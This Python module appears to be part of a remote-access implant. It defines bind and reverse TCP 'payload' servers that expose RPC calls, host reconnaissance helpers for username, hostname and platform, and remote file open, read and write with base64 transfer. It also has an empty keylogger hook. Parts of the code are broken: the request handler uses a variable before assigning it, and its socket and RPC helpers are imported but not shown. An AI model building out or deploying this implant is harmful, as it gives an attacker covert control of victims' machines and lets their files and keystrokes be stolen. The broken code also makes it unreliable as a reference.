# -*- coding: utf-8 -*-

import platform
import socket
import socketserver
import sys

from .. import sock
from .. import rpc


class PayloadRPCDispatcher(rpc.RPCHandler):
    ''' Mix-in class that dispatches RPC requests. '''

    def rpc_dir(self):
        return list(self._functions)

    def rpc_echo(self, s):
        return s

    def register_file_service(self, mode):
        pass

    def register_keylogger(self):
        pass


class PayloadRequestHandler(socketserver.BaseRequestHandler):

    def handle(self):
        #self.server.handle_request(self.request)
        data = self.decode_request_data(data)
        response = self.server._marshalled_dispatch(data)

    def decode_request_data(self, data):
        return data


class TCPBindPayload(socketserver.TCPServer, PayloadRPCDispatcher):

    def __init__(self, addr, requestHandler=PayloadRequestHandler,
            logRequests=True, allow_none=False, encoding=None,
            bind_and_activate=True, use_builtin_types=False):
        self.logRequests = logRequests

        #PayloadRPCDispatcher.__init__(self, allow_none, encoding, use_builtin_types)
        PayloadRPCDispatcher.__init__(self)
        socketserver.TCPServer.__init__(self, addr, requestHandler, bind_and_activate)

    def handle_request(self, request):
        conn = sock.Connection(request)
        return self.handle_connection(conn)


class TCPReversePayload(sock.TCPClient, PayloadRPCDispatcher):
    
    def __init__(self, addr, retry_interval=1):
        PayloadRPCDispatcher.__init__(self)
        sock.TCPClient.__init__(self, addr, retry_interval)

    def __enter__(self):
        return self

    def __exit__(self, *args, **kwargs):
        pass


def uname():
    import platform
    return platform.uname()


def get_file_size(path):
    import os
    return os.path.getsize(path)


def get_username():
    import getpass
    return getpass.getuser()


def get_hostname():
    import socket
    return socket.gethostname()


def get_platform():
    import sys
    return sys.platform


def list_dir(path):
    import os
    return os.listdir(path)


def change_dir(path):
    import os
    path = os.path.expanduser(path)
    os.chdir(path)


def get_current_dir():
    import os
    return os.getcwd()


class FileService:

    def __new__(cls, r=True, w=True):
        class _FileService(FileOpener, FileReader, FileWriter):
            pass
        return _FileService()


class FileOpener:

    def __init__(self):
        self.open_files = dict()

    def open_file(self, path, mode='r'):
        f = open(path, mode)
        fid = id(f)
        self.open_files[fid] = f
        return fid

    def close_file(self, fid):
        if fid not in self.open_files:
            return
        f = self.open_files[fid]
        f.close()
        del self.open_files[fid]


class FileReader:

    def read_file(self, fid, size):
        import base64
        f = self.open_files[fid]
        data = f.read(size)
        return base64.urlsafe_b64encode(data)


class FileWriter:

    def write_file(self, fid, data):
        import base64
        f = self.open_files[fid]
        data = base64.urlsafe_b64decode(data)
        f.write(data)
        f.flush()

